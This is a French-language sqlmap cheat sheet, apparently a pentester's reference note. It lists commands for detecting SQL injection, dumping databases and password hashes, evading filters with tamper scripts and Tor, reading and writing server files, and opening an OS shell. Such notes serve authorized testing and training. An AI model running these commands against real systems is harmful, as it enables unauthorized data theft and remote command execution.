# Purpose

Automatiser la détection et l'exploitation des **SQL Injection**.

# Typical Use Cases

- Détection et exploitation de SQLi.
- Énumération de bases de données.
- Extraction de données.
- Récupération de mots de passe.
- Lecture et écriture de fichiers.
- Exécution de commandes sur le système.

# Installation

```sh
# Installer SQLMap
sudo apt-get install sqlmap
```

# Typical Workflow

```sh
# Tester une URL
sqlmap -u "http://$Domain/vuln.php?id=1" --batch

# Identifier les informations de la base
sqlmap -u "$URL" --banner --current-user --current-db --is-dba --batch

# Énumérer les bases
sqlmap -u "$URL" --dbs --batch

# Énumérer les tables
sqlmap -u "$URL" -D "$Database" --tables --batch

# Dumper une table
sqlmap -u "$URL" -D "$Database" -T "$Table" --dump --batch
```

# Common Flags

**HTTP Requests**
- `-u` : URL cible
- `--data` : données POST
- `-r` : requête HTTP depuis un fichier
- `-p` : paramètre à tester
- `--cookie` : ajouter un cookie
- `-H` : ajouter un header
- `--method` : méthode HTTP

**User-Agent**
- `--random-agent` : User-Agent aléatoire

**Output / Debug**
- `--batch` : utiliser les choix par défaut
- `-v` : niveau de verbosité (`0-6`)
- `-t` : enregistrer le trafic
- `--parse-errors` : afficher les erreurs DBMS

**Proxy / Network**
- `--proxy` : utiliser un proxy

**Tuning**
- `--level` : niveau de tests (`1-5`)
- `--risk` : niveau de risque (`1-3`)
- `--prefix` / `--suffix` : modifier les payloads

**Parameter Manipulation**
- `--csrf-token` : gérer un token CSRF
- `--randomize` : randomiser un paramètre
- `--eval` : recalculer un paramètre

**Bypass**
- `--tamper` : utiliser des scripts tamper
- `--hpp` : HTTP Parameter Pollution
- `--chunked` : utiliser HTTP chunked

# Usage Examples

## Requêtes HTTP

```sh
# Requête POST
sqlmap "$URL" --data="uid=1&name=test"

# Tester uniquement un paramètre
sqlmap "$URL" --data="uid=1*&name=test"

# Charger une requête HTTP complète
sqlmap -r "$RequestFile"

# Ajouter un cookie
sqlmap "$URL" --cookie="PHPSESSID=$Session"

# Ajouter un header
sqlmap "$URL" -H="Cookie: PHPSESSID=$Session"
```

## Database Enumeration

```sh
# Afficher la version du SGBD
sqlmap -u "$URL" --banner

# Identifier l'utilisateur courant
sqlmap -u "$URL" --current-user

# Identifier la base courante
sqlmap -u "$URL" --current-db

# Vérifier les privilèges DBA
sqlmap -u "$URL" --is-dba
````

```sh
# Lister les bases de données 
sqlmap -u "$URL" --dbs

# Lister les tables
sqlmap -u "$URL" -D "$Database" --tables

# Dumper une table 
sqlmap -u "$URL" -D "$Database" -T "$Table" --dump

# Dumper certaines colonnes
sqlmap -u "$URL" -D "$Database" -T "$Table" -C "$Column1,$Column2" --dump

# Dumper certaines lignes
sqlmap -u "$URL" -D "$Database" -T "$Table" --dump --start=2 --stop=3

# Utiliser une condition WHERE
sqlmap -u "$URL" -D "$Database" -T "$Table" --dump --where="name LIKE 'f%'"

# Énumérer le schéma
sqlmap -u "$URL" --schema

# Rechercher une colonne intéressante
sqlmap -u "$URL" --search -C password

# Énumérer les mots de passe du SGBD
sqlmap -u "$URL" --passwords
```

## Bypass / Tuning

```sh
# Augmenter le niveau de tests
sqlmap -u "$URL" --level=5 --risk=3

# Ajouter un préfixe/suffixe
sqlmap -u "$URL" --prefix="$Prefix" --suffix="$Suffix"

# Randomiser un paramètre
sqlmap -u "$URL" --randomize="$Parameter"

# Recalculer un paramètre
sqlmap -u "$URL" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

# Gérer un token CSRF
sqlmap -u "$URL" --csrf-token="$CsrfToken"

# Utiliser un User-Agent aléatoire
sqlmap -u "$URL" --random-agent

# Utiliser un proxy
sqlmap -u "$URL" --proxy="$Proxy"

# Utiliser Tor
sqlmap -u "$URL" --tor

# Vérifier Tor
sqlmap -u "$URL" --check-tor

# Utiliser des tamper scripts
sqlmap -u "$URL" --tamper="$Script1,$Script2"
```

## OS Exploitation

```sh
# Lire un fichier
sqlmap -u "$URL" --file-read="$File"

# Écrire un fichier
sqlmap -u "$URL" --file-write="$LocalFile" \
--file-dest="$RemoteFile"

# Obtenir un shell système
sqlmap -u "$URL" --os-shell
```

## Websocket

```sh
# Interaction via un websocket
sqlmap -u "ws://$IP$" --data '{"id": "*"}' --dbs --batch
# Penser a augmenter level/risk si pas de reussite
````

# Useful Commands

```sh
# Afficher l'aide
sqlmap -h

# Afficher l'aide avancée
sqlmap -hh

# Afficher les erreurs de la base
sqlmap -u "$URL" --parse-errors

# Afficher les payloads
sqlmap -u "$URL" -v 3

# Afficher les requêtes HTTP
sqlmap -u "$URL" -v 4

# Enregistrer le trafic
sqlmap -u "$URL" -t "$File"

# Lister les tamper scripts
sqlmap --list-tampers

# Dumper toutes les bases
sqlmap -u "$URL" --dump-all --exclude-sysdbs
```

# Notes

- Pour une requête HTTP complexe, utiliser `-r` avec une requête copiée depuis Burp.
- Une requête copiée avec **Copy as cURL** peut être adaptée pour SQLMap.
- `--level` contrôle la quantité de tests effectués (`1-5`).
- `--risk` contrôle le niveau de risque des tests (`1-3`).
- `--tamper` permet de modifier les payloads afin de contourner certaines protections.
- `--file-read`, `--file-write` et `--os-shell` dépendent des privilèges du compte DB et du SGBD.
- SQLMap peut proposer de casser les hashes de mots de passe récupérés avec une attaque dictionnaire.
# References

-> [[SQL Injection]]  
-> [[Burp Suite]]  
-> [[WAF]]  
-> [[Tamper Scripts]]